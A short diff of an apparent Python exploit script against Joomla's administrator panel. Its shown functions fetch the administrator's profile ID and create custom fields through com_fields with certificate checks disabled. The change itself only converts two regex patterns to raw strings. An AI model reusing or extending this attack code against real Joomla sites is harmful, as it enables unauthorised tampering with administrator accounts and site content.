@@ -52,7 +52,7 @@ def check_admin(sess, url):
 def getManagerId(url, sess):
     url_get = url + '/administrator/index.php?option=com_admin&view=profile&layout=edit'
     resp = sess.get(url_get, verify=False)
-    return re.findall('id=\d+', resp.text)
+    return re.findall(r'id=\d+', resp.text)
 
 def createNewField(url, sess, token):
     data = {
@@ -75,7 +75,7 @@ def createNewField(url, sess, token):
         token: 1
     }
     resp = sess.post(url + "/administrator/index.php?option=com_fields&context=com_content.article", data=data, verify=False)
-    id = re.findall('id=\d+', resp.text)
+    id = re.findall(r'id=\d+', resp.text)
     id_account = getManagerId(url, sess)
     ran = '%d' % random.randrange(1, 10000)
     url_post = url + '/administrator/index.php?option=com_fields&context=com_content.article&layout=edit&' + id[0]
